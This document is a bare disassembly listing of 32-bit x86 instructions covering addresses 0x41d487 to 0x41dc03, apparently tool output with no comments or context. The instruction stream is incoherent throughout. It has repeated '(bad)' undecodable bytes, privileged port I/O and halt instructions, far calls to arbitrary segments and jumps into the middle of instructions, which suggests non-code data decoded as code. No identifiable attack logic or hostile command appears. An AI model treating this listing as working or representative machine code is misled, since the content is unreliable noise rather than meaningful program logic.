  41d487:	es hlt 
  41d489:	mov    esp,0xf3eacb1a
  41d48e:	push   0xffffffa8
  41d490:	ret    
  41d491:	pushw  ds
  41d493:	daa    
  41d494:	adc    BYTE PTR [eax-0x5f],al
  41d497:	cmp    al,0x95
  41d499:	mov    edi,0xbc392409
  41d49e:	fld    DWORD PTR [edx-0x37]
  41d4a2:	add    ch,BYTE PTR [ebp+edx*2+0x61]
  41d4a6:	stos   DWORD PTR es:[edi],eax
  41d4a7:	sbb    DWORD PTR [ebx],ebx
  41d4a9:	jmp    0x19634768
  41d4ae:	cdq    
  41d4af:	shr    BYTE PTR [ebx-0x4590aa8b],0x8f
  41d4b6:	or     al,0xa1
  41d4b8:	xchg   edi,eax
  41d4b9:	ja     0x41d456
  41d4bb:	imul   esp,DWORD PTR ds:0xa0ab6e85,0x5d
  41d4c2:	leave  
  41d4c3:	mov    cl,0x5
  41d4c5:	add    eax,0x8daae296
  41d4ca:	loope  0x41d49a
  41d4cc:	(bad)  
  41d4cd:	push   ecx
  41d4ce:	inc    ebx
  41d4cf:	fwait
  41d4d0:	add    dl,al
  41d4d2:	pop    ecx
  41d4d3:	pop    edx
  41d4d4:	cmp    ch,BYTE PTR [ebx-0x53]
  41d4d7:	lods   eax,DWORD PTR ds:[esi]
  41d4d8:	in     eax,dx
  41d4d9:	aas    
  41d4da:	sbb    al,0x55
  41d4dc:	xchg   ebp,eax
  41d4dd:	cmp    bl,bh
  41d4df:	inc    esp
  41d4e0:	cmc    
  41d4e1:	jo     0x41d468
  41d4e3:	push   es
  41d4e4:	imul   edi,ebx,0xae7671b1
  41d4ea:	push   esi
  41d4eb:	repz jnp 0x41d54a
  41d4ee:	cmp    ch,dl
  41d4f0:	push   0xffffffd0
  41d4f2:	ds ds (bad) 
  41d4f5:	ror    bl,1
  41d4f7:	dec    edi
  41d4f8:	sub    al,0x9b
  41d4fa:	mov    esp,0x251a2c7b
  41d4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d500:	pushf  
  41d501:	xor    edx,ebx
  41d503:	sub    edi,DWORD PTR [edx]
  41d505:	lock (bad) 
  41d507:	pop    bp
  41d509:	jg     0x41d55c
  41d50b:	leave  
  41d50c:	out    dx,eax
  41d50d:	add    esi,edi
  41d50f:	paddq  mm2,QWORD PTR [ebx-0x1c]
  41d513:	imul   ebp,DWORD PTR [ecx+ebp*2-0x5c],0x3bc762ce
  41d51b:	sbb    edx,ebp
  41d51d:	and    edx,DWORD PTR [ebx+0x2dd8ac3c]
  41d523:	jnp    0x41d515
  41d525:	jne    0x41d5a1
  41d527:	shl    DWORD PTR [ebp-0x6f],cl
  41d52a:	xor    ebp,DWORD PTR [edx]
  41d52c:	pop    esi
  41d52d:	sub    al,0xbd
  41d52f:	mov    eax,0x753ea311
  41d534:	data16 jo 0x41d4c7
  41d537:	and    eax,0xa7844c0
  41d53c:	(bad)
  41d53f:	sahf   
  41d540:	jb     0x41d522
  41d542:	cmp    esi,DWORD PTR [ebp+0x7aad1723]
  41d548:	push   0x6abd198d
  41d54d:	push   ecx
  41d54e:	sub    ebx,ebx
  41d550:	adc    eax,esi
  41d552:	inc    ecx
  41d553:	in     eax,dx
  41d554:	cli    
  41d555:	mov    al,0x78
  41d557:	ss dec edi
  41d559:	call   0x584:0xc0da51d6
  41d560:	test   BYTE PTR [ecx+0x35],al
  41d563:	stos   DWORD PTR es:[edi],eax
  41d564:	test   DWORD PTR [eax+0x4efd174d],ebx
  41d56a:	aaa    
  41d56b:	cli    
  41d56c:	push   ds
  41d56d:	ficom  WORD PTR [esi-0x7d]
  41d570:	fld    TBYTE PTR [ebx+0x6d7539a8]
  41d576:	jmp    0x41d563
  41d578:	daa    
  41d579:	mov    WORD PTR [ebx+0x15],ss
  41d57c:	adc    al,0xf9
  41d57e:	mov    esi,0xc02151e1
  41d583:	cs xchg esi,eax
  41d585:	(bad)
  41d58a:	jp     0x41d52d
  41d58c:	outs   dx,BYTE PTR ds:[esi]
  41d58d:	sub    BYTE PTR [ecx+ebp*8],0x9b
  41d591:	mov    edx,DWORD PTR [edi]
  41d593:	ss scas eax,DWORD PTR es:[edi]
  41d595:	cmp    al,0xba
  41d597:	fistp  QWORD PTR [ebx+ebp*2-0x54]
  41d59b:	mov    WORD PTR [eax],gs
  41d59d:	stc    
  41d59e:	xchg   edi,ecx
  41d5a0:	addr16 xchg ecx,eax
  41d5a2:	outs   dx,DWORD PTR ds:[esi]
  41d5a3:	cmp    BYTE PTR [ecx],0x2e
  41d5a6:	inc    edi
  41d5a7:	mov    ebx,ecx
  41d5a9:	cmp    BYTE PTR [edi-0x2d],0xa8
  41d5ad:	hlt    
  41d5ae:	out    dx,al
  41d5af:	pop    edi
  41d5b0:	inc    edx
  41d5b1:	les    esp,FWORD PTR [ecx-0x53218038]
  41d5b7:	mov    edi,0x3e5bd65c
  41d5bc:	add    al,0x9a
  41d5be:	jmp    FWORD PTR [eax]
  41d5c0:	cwde   
  41d5c1:	xchg   esi,eax
  41d5c2:	sbb    eax,0xa570fba8
  41d5c7:	mov    ds:0x94feb080,eax
  41d5cc:	and    dh,bl
  41d5ce:	push   esp
  41d5cf:	test   DWORD PTR [edx-0x12559627],ebp
  41d5d5:	push   edx
  41d5d6:	sbb    eax,0x2088aa64
  41d5db:	jns    0x41d592
  41d5dd:	outs   dx,BYTE PTR ds:[esi]
  41d5de:	cwde   
  41d5df:	loop   0x41d61c
  41d5e1:	lahf   
  41d5e2:	call   0x4c5a1acb
  41d5e7:	xlat   BYTE PTR ds:[ebx]
  41d5e8:	mov    bl,0xf6
  41d5ea:	(bad)  
  41d5eb:	lods   eax,DWORD PTR ds:[esi]
  41d5ec:	in     al,0x3c
  41d5ee:	push   ebp
  41d5ef:	or     DWORD PTR [edx+0x20],edi
  41d5f2:	jbe    0x41d5d5
  41d5f4:	ret    0xd519
  41d5f7:	mov    ebp,0x25951c73
  41d5fc:	ffreep st(6)
  41d5fe:	mov    ah,0xba
  41d600:	push   ds
  41d601:	(bad)  [esi-0x5]
  41d604:	sar    BYTE PTR [esi-0x4d6c50fb],1
  41d60a:	xor    DWORD PTR [ecx+0x5b],edi
  41d60d:	(bad)  
  41d60e:	xchg   esp,eax
  41d60f:	scas   eax,DWORD PTR es:[edi]
  41d610:	cmp    BYTE PTR [ebx-0x7a],bh
  41d613:	mov    al,ds:0x5c8f0494
  41d618:	sbb    DWORD PTR [edi-0x585882ef],ebx
  41d61e:	in     eax,dx
  41d61f:	jae    0x41d62c
  41d621:	jl     0x41d670
  41d623:	xchg   esi,eax
  41d624:	or     DWORD PTR [eax],0xfffffffb
  41d627:	mov    al,ds:0xda673190
  41d62c:	fbld   TBYTE PTR [eax+ebp*2+0x2e]
  41d630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d631:	push   0xffffffa1
  41d633:	ins    DWORD PTR es:[edi],dx
  41d634:	jmp    0x41d655
  41d636:	add    al,0xaf
  41d638:	inc    ecx
  41d639:	ror    bh,0x5f
  41d63c:	idiv   BYTE PTR [edi]
  41d63e:	sahf   
  41d63f:	xlat   BYTE PTR ds:[ebx]
  41d640:	cmc    
  41d641:	sbb    eax,0x8d1d4ead
  41d646:	lods   al,BYTE PTR ds:[esi]
  41d647:	mov    esi,0x4943b7bc
  41d64c:	push   0x8f4d61e4
  41d651:	and    DWORD PTR [eax+ecx*4-0x60870641],ecx
  41d658:	cmp    bl,ah
  41d65a:	pusha  
  41d65b:	(bad)  
  41d65c:	jl     0x41d673
  41d65e:	pop    ecx
  41d65f:	mov    edi,0x967b2235
  41d664:	in     al,dx
  41d665:	daa    
  41d666:	stc    
  41d667:	dec    esi
  41d668:	xchg   edi,eax
  41d669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d66a:	pop    ds
  41d66b:	lds    esi,FWORD PTR [ecx]
  41d66d:	add    DWORD PTR [ebx],ebp
  41d66f:	xor    al,0xc6
  41d671:	leave  
  41d672:	sub    eax,0x8229ad9e
  41d677:	add    BYTE PTR [edx-0x524b4dd9],ch
  41d67d:	(bad)  
  41d67e:	js     0x41d6df
  41d680:	sub    DWORD PTR [ebx+0x26],ecx
  41d683:	mov    ebx,0xddd691f3
  41d688:	xchg   ebx,eax
  41d689:	push   ds
  41d68a:	scas   al,BYTE PTR es:[edi]
  41d68b:	xor    cl,BYTE PTR [ecx+0x2]
  41d68e:	lock sub eax,0xfb253819
  41d694:	mov    dl,dl
  41d696:	test   eax,0x931d35d4
  41d69b:	out    dx,al
  41d69c:	leave  
  41d69d:	scas   eax,DWORD PTR es:[edi]
  41d69e:	push   0x6a72ba1b
  41d6a3:	mov    cl,0xd3
  41d6a5:	mov    esp,0x2402e439
  41d6aa:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ac:	pop    esp
  41d6ad:	clc    
  41d6ae:	inc    esi
  41d6af:	test   DWORD PTR [esi-0x8],edx
  41d6b2:	aad    0xfb
  41d6b4:	in     al,dx
  41d6b5:	pop    edx
  41d6b6:	push   esi
  41d6b7:	(bad)  
  41d6b8:	out    0xe1,eax
  41d6ba:	and    cl,BYTE PTR [esi+0x36b5471b]
  41d6c0:	xor    ebp,DWORD PTR [edx+0x2f]
  41d6c3:	out    0xae,eax
  41d6c5:	or     eax,ebx
  41d6c7:	rcl    cl,cl
  41d6c9:	aaa    
  41d6ca:	pop    ss
  41d6cb:	(bad)  
  41d6cd:	cld    
  41d6ce:	and    DWORD PTR [ebx-0x786ba795],esi
  41d6d4:	adc    BYTE PTR [eax+0x21],0x6
  41d6d8:	fld    DWORD PTR [esi]
  41d6da:	cmp    BYTE PTR [eax],cl
  41d6dc:	xchg   edx,ebx
  41d6de:	cmp    BYTE PTR [edi],ch
  41d6e0:	adc    al,0x35
  41d6e2:	push   ebp
  41d6e3:	add    eax,0x18107d8b
  41d6e8:	icebp  
  41d6e9:	aad    0x8e
  41d6eb:	mov    ds:0x4f40d75b,al
  41d6f0:	sbb    eax,0xae9d697a
  41d6f5:	add    al,0xc2
  41d6f7:	pop    esp
  41d6f8:	ins    BYTE PTR es:[edi],dx
  41d6f9:	inc    ecx
  41d6fa:	mov    edi,0x555120d9
  41d6ff:	push   es
  41d700:	jle    0x41d767
  41d702:	mov    dh,0x32
  41d704:	dec    ebx
  41d705:	in     eax,dx
  41d706:	sub    al,BYTE PTR [ebx]
  41d708:	mov    cl,0x10
  41d70a:	rcl    BYTE PTR [edx],cl
  41d70c:	retf   0x5b9f
  41d70f:	pop    ds
  41d710:	aas    
  41d711:	into   
  41d712:	dec    edx
  41d713:	jle    0x41d6b7
  41d715:	in     eax,dx
  41d716:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d718:	push   ds
  41d719:	repnz inc ebp
  41d71b:	jae    0x41d76e
  41d71d:	(bad)
  41d720:	imul   esp,DWORD PTR [eax],0xffffffba
  41d723:	jp     0x41d6b3
  41d725:	rol    edx,1
  41d727:	dec    ebp
  41d728:	xlat   BYTE PTR ds:[ebx]
  41d729:	jbe    0x41d773
  41d72b:	ds jae 0x41d770
  41d72e:	pop    ebp
  41d72f:	mov    ah,0xd8
  41d731:	scas   eax,DWORD PTR es:[edi]
  41d732:	fisttp DWORD PTR [eax]
  41d734:	add    esi,0x19292e48
  41d73a:	scas   al,BYTE PTR es:[edi]
  41d73b:	stc    
  41d73c:	shr    DWORD PTR [esi],1
  41d73e:	test   BYTE PTR [ebp+0x32],al
  41d741:	push   esp
  41d742:	lds    ebx,FWORD PTR [edx+0x61]
  41d745:	adc    dh,ah
  41d747:	inc    ecx
  41d748:	sti    
  41d749:	std    
  41d74a:	and    bl,BYTE PTR [eax+0x1de475e]
  41d750:	pusha  
  41d751:	(bad)  
  41d752:	jge    0x41d754
  41d754:	mov    ds:0x1bf71195,eax
  41d759:	mov    ah,0x2a
  41d75b:	push   cs
  41d75c:	inc    edx
  41d75d:	or     edi,DWORD PTR [esi-0x6f]
  41d760:	sbb    al,0x35
  41d762:	inc    eax
  41d763:	xor    eax,0xaed97d12
  41d768:	push   ds
  41d769:	jg     0x41d78d
  41d76b:	outs   dx,DWORD PTR ds:[esi]
  41d76c:	jb     0x41d7ae
  41d76e:	repz mov ebp,0xe5353ffa
  41d774:	mov    ebp,0x473de0f4
  41d779:	cs mov dh,0xa9
  41d77c:	add    eax,eax
  41d77e:	popw   ss
  41d780:	cmp    ecx,ebx
  41d782:	push   ds
  41d783:	idiv   BYTE PTR [eax-0x30]
  41d786:	repnz outs dx,DWORD PTR ds:[esi]
  41d788:	or     al,0x44
  41d78a:	mov    al,0x7a
  41d78c:	mov    dl,0x3f
  41d78e:	jo     0x41d753
  41d790:	test   al,0x59
  41d792:	in     al,0x1c
  41d794:	xlat   BYTE PTR ds:[ebx]
  41d795:	push   ss
  41d796:	xor    BYTE PTR [ebp+0x7b],ch
  41d799:	loop   0x41d784
  41d79b:	test   al,0xef
  41d79d:	inc    eax
  41d79e:	mov    ebp,0xfab6283e
  41d7a3:	ror    BYTE PTR [edi],0x15
  41d7a6:	int    0xa0
  41d7a8:	lock in al,dx
  41d7aa:	retf   
  41d7ab:	sbb    BYTE PTR [ecx+esi*4-0x10ac61b7],bl
  41d7b2:	icebp  
  41d7b3:	psrlq  mm6,QWORD PTR [esi-0x1282e50d]
  41d7ba:	inc    ebp
  41d7bb:	adc    al,0xe1
  41d7bd:	call   0xfd861b12
  41d7c2:	xchg   DWORD PTR [ebp+0x3b],ecx
  41d7c5:	fnstcw WORD PTR [edi+0x3c]
  41d7c8:	call   0xcd1:0x318b03c4
  41d7cf:	fild   DWORD PTR [esi-0x46a3432d]
  41d7d5:	sbb    BYTE PTR [esi+0x4cccedd5],al
  41d7db:	add    eax,0xd3099124
  41d7e0:	aad    0x98
  41d7e2:	mov    edx,DWORD PTR [ebp-0x6d546ad9]
  41d7e8:	inc    edi
  41d7e9:	mov    fs,WORD PTR [ebx+0x72]
  41d7ec:	aad    0xe5
  41d7ee:	lock xlat BYTE PTR ds:[ebx]
  41d7f0:	call   FWORD PTR [ebp-0x73]
  41d7f3:	inc    ax
  41d7f5:	test   ebx,ecx
  41d7f7:	mov    esp,0xe0342d2b
  41d7fc:	mov    bh,0xe2
  41d7fe:	push   ecx
  41d7ff:	ss rol al,0x6e
  41d803:	mov    cl,0xda
  41d805:	and    DWORD PTR [ecx-0x6d],esi
  41d808:	test   al,0x30
  41d80a:	jne    0x41d82f
  41d80c:	and    al,0xe9
  41d80e:	bound  ecx,QWORD PTR [esi+0x23]
  41d811:	mov    BYTE PTR [edi+0x24803e38],ch
  41d817:	xor    al,0xab
  41d819:	add    eax,0x831cdd9c
  41d81e:	jns    0x41d807
  41d820:	sub    edi,edx
  41d822:	xchg   ebx,eax
  41d823:	mov    ch,0xff
  41d825:	and    al,0xe
  41d827:	push   esp
  41d828:	cmp    eax,0x47f4ed77
  41d82e:	sbb    DWORD PTR [ebx+0x1f],0xffffffa4
  41d832:	inc    ebp
  41d833:	xchg   DWORD PTR [ebp-0x192b6f05],eax
  41d839:	cdq    
  41d83a:	mov    edi,0xd115524d
  41d83f:	mov    eax,0x5292edec
  41d844:	xor    eax,ebx
  41d846:	pop    ebp
  41d847:	xchg   esi,eax
  41d848:	pop    ebp
  41d849:	popa   
  41d84a:	adc    eax,0x6a026cbe
  41d84f:	mov    WORD PTR [esi+0x69dbb0c9],?
  41d855:	mov    edi,0xc722bf8f
  41d85a:	inc    ecx
  41d85b:	rcl    cl,0x9b
  41d85e:	gs inc ecx
  41d860:	aam    0x8f
  41d862:	inc    edi
  41d863:	sub    ah,BYTE PTR [edi-0x24eb6477]
  41d869:	lea    esi,[ecx-0x512fa6ac]
  41d86f:	test   ah,0xb6
  41d872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d873:	rol    BYTE PTR ds:0x57d28730,0x38
  41d87a:	mov    esp,0x87fd9c53
  41d87f:	into   
  41d880:	mov    dh,0xd2
  41d882:	sahf   
  41d883:	lods   al,BYTE PTR ss:[esi]
  41d885:	mov    al,BYTE PTR [edi-0x760189b]
  41d88b:	xchg   ebp,eax
  41d88c:	mov    ecx,0x91ea3a86
  41d891:	das    
  41d892:	pusha  
  41d893:	sbb    ecx,DWORD PTR [ebx]
  41d895:	jo     0x41d8b6
  41d897:	and    al,0x6a
  41d899:	jecxz  0x41d905
  41d89b:	add    DWORD PTR [ecx],eax
  41d89d:	pusha  
  41d89e:	sub    eax,0x9b5ae93e
  41d8a3:	fild   QWORD PTR [edx+0x2fbfbba3]
  41d8a9:	sbb    DWORD PTR [esi+0xb],esi
  41d8ac:	adc    dh,BYTE PTR [eax+edi*4]
  41d8af:	jno    0x41d83e
  41d8b1:	test   DWORD PTR [ebp-0x3910f526],edx
  41d8b7:	or     al,0x71
  41d8b9:	nop
  41d8ba:	neg    DWORD PTR [ecx]
  41d8bc:	inc    esp
  41d8bd:	and    eax,0xb39fd46a
  41d8c2:	pushf  
  41d8c3:	cmp    ebp,DWORD PTR [ebx-0x38]
  41d8c6:	icebp  
  41d8c7:	jo     0x41d8fd
  41d8c9:	daa    
  41d8ca:	xchg   esi,eax
  41d8cb:	ret    
  41d8cc:	inc    ebp
  41d8cd:	push   cs
  41d8ce:	and    dh,BYTE PTR [eax]
  41d8d0:	loop   0x41d8fa
  41d8d2:	push   0xb64f0232
  41d8d7:	xchg   esi,eax
  41d8d8:	cmp    dh,dl
  41d8da:	inc    esi
  41d8db:	mov    ebp,0xaeba59a7
  41d8e0:	aam    0xe
  41d8e2:	xor    BYTE PTR [edx],dl
  41d8e4:	mov    ah,BYTE PTR [ecx]
  41d8e6:	jecxz  0x41d933
  41d8e8:	idiv   BYTE PTR [eax-0x11]
  41d8eb:	xor    DWORD PTR [edi-0x44],ebx
  41d8ee:	(bad)  
  41d8ef:	xchg   ebp,eax
  41d8f0:	ret    
  41d8f1:	cmp    cl,BYTE PTR [eax]
  41d8f3:	push   esp
  41d8f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8f5:	push   0x1fb6453b
  41d8fa:	mov    eax,0x4d6add85
  41d8ff:	push   es
  41d900:	mov    edi,0xc73f00e5
  41d905:	push   edx
  41d906:	dec    esp
  41d907:	jle    0x41d961
  41d909:	push   ebp
  41d90a:	lea    esi,[ebp+0x70a27974]
  41d910:	bswap  edi
  41d912:	mov    ebp,0x444d85e
  41d917:	test   DWORD PTR [ebp+0x7bc85d4],edi
  41d91d:	std    
  41d91e:	in     al,dx
  41d91f:	pop    esi
  41d920:	(bad)  [esi-0x5d7332]
  41d926:	adc    al,0x75
  41d928:	fidiv  DWORD PTR [ebp+0x2d0a4278]
  41d92e:	sbb    DWORD PTR [ecx+ebx*4+0x15],esp
  41d932:	pop    es
  41d933:	cwde   
  41d934:	and    esp,DWORD PTR [eax-0x4b]
  41d937:	sub    eax,0x3a79e866
  41d93c:	iret   
  41d93d:	(bad)  
  41d93e:	ja     0x41d98f
  41d940:	adc    BYTE PTR [ecx-0x17992c56],0xae
  41d947:	mov    ebx,0x4d37e77b
  41d94c:	out    dx,al
  41d94d:	ds mov esp,0x99be739f
  41d953:	jecxz  0x41d935
  41d955:	mov    edi,0xf82320b3
  41d95a:	loop   0x41d8ef
  41d95c:	mov    bh,bl
  41d95e:	imul   edi,DWORD PTR [bp+di],0x593d109f
  41d965:	cmp    bl,cl
  41d967:	pop    es
  41d968:	pop    ebp
  41d969:	in     eax,0x89
  41d96b:	daa    
  41d96c:	xchg   ecx,eax
  41d96d:	outs   dx,DWORD PTR ds:[esi]
  41d96e:	mul    ebx
  41d970:	str    WORD PTR [ecx+0x4b]
  41d974:	call   0xc88f:0x348b3cce
  41d97b:	lahf   
  41d97c:	cli    
  41d97d:	mov    dl,0x89
  41d97f:	out    0x74,al
  41d981:	popf   
  41d982:	push   es
  41d983:	das    
  41d984:	mov    BYTE PTR [ecx],al
  41d986:	sbb    ebx,DWORD PTR [ebp+ecx*1+0x261abf42]
  41d98d:	cdq    
  41d98e:	xchg   ebp,eax
  41d98f:	hlt    
  41d990:	xchg   ecx,eax
  41d991:	leave  
  41d992:	call   0x8772:0x75bbcc8
  41d999:	and    BYTE PTR [ebp+0x67],bh
  41d99c:	fwait
  41d99d:	leave  
  41d99e:	inc    ebx
  41d99f:	arpl   WORD PTR [eax],dx
  41d9a1:	rcr    BYTE PTR [ebp+0x33],1
  41d9a4:	cdq    
  41d9a5:	jae    0x41d938
  41d9a7:	daa    
  41d9a8:	iret   
  41d9a9:	mov    al,ds:0x80860aef
  41d9af:	xchg   ebx,eax
  41d9b0:	push   ecx
  41d9b1:	push   ecx
  41d9b2:	pop    ss
  41d9b3:	std    
  41d9b4:	mov    dh,0x73
  41d9b6:	fidivr DWORD PTR ss:[edi]
  41d9b9:	xor    esp,DWORD PTR [edx+0x6b]
  41d9bc:	lea    edx,[ebx-0x154b0489]
  41d9c2:	sub    eax,0x41aaeb92
  41d9c7:	jo     0x41d9f6
  41d9c9:	or     BYTE PTR [ebx],0x12
  41d9cc:	out    0x4,al
  41d9ce:	aad    0x5d
  41d9d0:	cmp    ah,ah
  41d9d2:	xor    DWORD PTR [eax],edx
  41d9d4:	sar    DWORD PTR [edi+0x50],cl
  41d9d7:	sar    al,0xb9
  41d9da:	xlat   BYTE PTR ds:[ebx]
  41d9db:	jns    0x41da27
  41d9dd:	out    0xa9,eax
  41d9df:	xor    esi,DWORD PTR [esi+0x3f]
  41d9e2:	push   ds
  41d9e3:	xor    BYTE PTR [eax+0x45be0a61],dh
  41d9e9:	lahf   
  41d9ea:	ret    0x3b4d
  41d9ed:	cmp    al,0x67
  41d9ef:	mov    BYTE PTR [eax+0x7290c94b],al
  41d9f5:	adc    eax,0xd2a92029
  41d9fa:	jae    0x41d9ad
  41d9fc:	pop    esp
  41d9fd:	pop    edi
  41d9fe:	dec    edi
  41d9ff:	jbe    0x41da51
  41da01:	popf   
  41da02:	sbb    BYTE PTR [edi],dl
  41da04:	adc    BYTE PTR [edi],bh
  41da06:	dec    ebx
  41da07:	jl     0x41d9d0
  41da09:	lock in al,0xeb
  41da0c:	loopne 0x41da2d
  41da0e:	mov    DWORD PTR [edi+0x2c],ecx
  41da11:	and    DWORD PTR [edi+edi*2-0x4a],edi
  41da15:	(bad)
  41da18:	push   es
  41da19:	(bad)  
  41da1a:	dec    esi
  41da1b:	pop    edx
  41da1c:	out    0xc2,al
  41da1e:	aas    
  41da1f:	pop    ecx
  41da20:	push   es
  41da21:	dec    esp
  41da22:	xor    eax,0x8a424cbd
  41da27:	rcr    DWORD PTR [esi+0x5d],0x5d
  41da2b:	jmp    0xfa5d8a9d
  41da30:	jno    0x41da3b
  41da32:	popa   
  41da33:	lds    eax,FWORD PTR [esi+eax*2+0x197182da]
  41da3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da3b:	in     al,dx
  41da3c:	fcom   DWORD PTR [ebp+esi*2+0x4df754aa]
  41da43:	aaa    
  41da44:	dec    esi
  41da45:	mov    es,WORD PTR [ecx+0x66]
  41da48:	out    0x27,eax
  41da4a:	cli    
  41da4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da4c:	adc    eax,0x2679038d
  41da51:	out    0x46,al
  41da53:	push   ds
  41da54:	and    al,0xa2
  41da56:	cmp    al,0x1e
  41da58:	sbb    edx,DWORD PTR [edx-0x22dfca9]
  41da5e:	leave  
  41da5f:	jp     0x41da45
  41da61:	std    
  41da62:	mov    ch,0xdb
  41da64:	dec    ebp
  41da65:	add    al,0x39
  41da67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da68:	mov    dl,BYTE PTR [ebx]
  41da6a:	(bad)  
  41da6c:	out    dx,al
  41da6d:	sbb    dl,ch
  41da6f:	xchg   ecx,eax
  41da70:	mov    bh,0xb2
  41da72:	out    dx,eax
  41da73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da74:	push   esp
  41da75:	inc    ebp
  41da76:	dec    dx
  41da78:	adc    eax,0x42ae071f
  41da7d:	(bad)  
  41da7e:	mov    dh,0xbb
  41da80:	nop
  41da81:	jg     0x41dafc
  41da83:	dec    eax
  41da84:	aad    0x8a
  41da86:	aas    
  41da87:	sbb    al,0xe6
  41da89:	pop    es
  41da8a:	jmp    0x41da84
  41da8c:	jl     0x41da26
  41da8e:	xchg   ecx,eax
  41da8f:	fcom   st(1)
  41da91:	adc    eax,0x68518704
  41da96:	int3   
  41da97:	inc    ecx
  41da98:	loope  0x41da65
  41da9a:	cmp    BYTE PTR [esi+edi*8+0x5284e0e7],cl
  41daa1:	neg    DWORD PTR [edx-0x35e9edc5]
  41daa7:	push   edx
  41daa8:	xor    al,0x68
  41daaa:	mov    ecx,eax
  41daac:	sbb    al,0xb4
  41daae:	int3   
  41daaf:	sub    eax,0xffee138a
  41dab4:	inc    edi
  41dab5:	mov    esi,0x5386baae
  41daba:	les    edi,FWORD PTR [ebp-0x233fd800]
  41dac0:	imul   edx,edx,0xfffffff0
  41dac3:	into   
  41dac4:	mov    WORD PTR [edx+ecx*4+0x23],ss
  41dac8:	dec    ebx
  41dac9:	adc    BYTE PTR [eax+edi*1],0x42
  41dacd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dace:	out    dx,al
  41dacf:	mov    fs,WORD PTR gs:[ecx-0x13]
  41dad3:	ret    0xa345
  41dad6:	pop    ebx
  41dad7:	inc    ebx
  41dad8:	lds    eax,FWORD PTR [ebx]
  41dada:	outs   dx,DWORD PTR ds:[esi]
  41dadb:	shl    BYTE PTR [ebx+0x340f61f1],0x19
  41dae2:	jg     0x41da93
  41dae4:	std    
  41dae5:	cmp    al,0x72
  41dae7:	push   edi
  41dae8:	imul   edx,DWORD PTR [ebx+0x66721ba7],0xf3a5a70e
  41daf2:	aam    0x51
  41daf4:	or     al,0xcc
  41daf6:	stc    
  41daf7:	gs out dx,eax
  41daf9:	mov    esp,ebp
  41dafb:	rcl    dh,0x76
  41dafe:	aas    
  41daff:	jnp    0x41db52
  41db01:	lea    ebp,[esi]
  41db03:	fstp   TBYTE PTR [edx]
  41db05:	ins    BYTE PTR es:[edi],dx
  41db06:	xchg   ecx,eax
  41db07:	pop    ds
  41db08:	cs xchg esp,eax
  41db0a:	jb     0x41db71
  41db0c:	add    ah,BYTE PTR [esi]
  41db0e:	rcl    al,0xc0
  41db11:	add    eax,0xe919113f
  41db16:	mov    edx,0x35a008ca
  41db1b:	cmp    DWORD PTR [ecx+0x5b],0xffffffa0
  41db1f:	mov    esi,0x5f4616c4
  41db24:	xchg   ebx,eax
  41db25:	hlt    
  41db26:	into   
  41db27:	mov    ebx,0xd1c8433e
  41db2c:	inc    eax
  41db2d:	cmp    cl,ch
  41db2f:	push   esi
  41db30:	fdiv   DWORD PTR [edi-0x6726c949]
  41db36:	jbe    0x41db0a
  41db38:	and    eax,0x351832ee
  41db3d:	mov    eax,ds:0x3d8384f1
  41db42:	lock and ebx,esi
  41db45:	mov    dl,0x5a
  41db47:	dec    eax
  41db48:	xlat   BYTE PTR ds:[ebx]
  41db49:	jne    0x41db6c
  41db4b:	mov    ds:0x94f99d65,eax
  41db50:	sahf   
  41db51:	(bad)  
  41db52:	loop   0x41dadf
  41db54:	mov    ecx,0x1a258ed5
  41db59:	(bad)  
  41db5a:	pop    DWORD PTR [eax+0x2f]
  41db5d:	cmp    al,0xd1
  41db5f:	leave  
  41db60:	pusha  
  41db61:	int3   
  41db62:	mov    al,bl
  41db64:	pushf  
  41db65:	mov    eax,ds:0x778b6d5b
  41db6a:	call   0x8b4b:0x73fbf9ca
  41db71:	xor    ch,ah
  41db73:	push   0x3ddef17c
  41db78:	loope  0x41dba7
  41db7a:	dec    edx
  41db7b:	or     esp,edx
  41db7d:	ins    DWORD PTR es:[edi],dx
  41db7e:	aas    
  41db7f:	pop    ecx
  41db80:	fldenv [edx+0x25741ff4]
  41db86:	imul   BYTE PTR [edi]
  41db88:	cmp    bh,BYTE PTR ds:0xe0a75f04
  41db8e:	pop    ds
  41db8f:	cdq    
  41db90:	and    esp,edx
  41db92:	repz mov bh,0x33
  41db95:	inc    eax
  41db96:	or     DWORD PTR [edx+0x6b1b9bec],ebx
  41db9c:	cmp    al,0x37
  41db9e:	shl    ebp,cl
  41dba0:	push   ebx
  41dba1:	rcl    DWORD PTR [ebx-0x12],1
  41dba4:	cdq    
  41dba5:	inc    edi
  41dba6:	sub    DWORD PTR [edi],ecx
  41dba8:	pop    es
  41dba9:	mov    eax,ds:0x9f69c4b1
  41dbae:	movlhps xmm4,xmm4
  41dbb1:	out    dx,eax
  41dbb2:	adc    eax,0x88769f41
  41dbb7:	sub    al,0x13
  41dbb9:	lahf   
  41dbba:	aaa    
  41dbbb:	push   0x529932db
  41dbc0:	pop    ss
  41dbc1:	test   cl,ah
  41dbc3:	or     dl,BYTE PTR [esp+eiz*2+0x28]
  41dbc7:	or     DWORD PTR [esi-0x17645630],eax
  41dbcd:	add    eax,0xb9ec0591
  41dbd2:	mov    edx,0x437fb651
  41dbd7:	and    eax,0xf6532550
  41dbdc:	push   ebp
  41dbdd:	or     eax,0xbb528974
  41dbe2:	loop   0x41dbbe
  41dbe4:	xchg   edx,eax
  41dbe5:	and    cl,0x90
  41dbe8:	mov    ah,0x21
  41dbea:	test   eax,0x524440cd
  41dbef:	nop
  41dbf0:	sbb    DWORD PTR [ebx+0x19988a60],edi
  41dbf6:	pop    esi
  41dbf7:	xor    BYTE PTR [eax],ch
  41dbf9:	xchg   edi,eax
  41dbfa:	retf   
  41dbfb:	mov    es,WORD PTR [edi+0x0]
  41dbfe:	push   ebp
  41dbff:	ds int3 
  41dc01:	jns    0x41dc00
  41dc03:	xor    eax,0x2301b01d
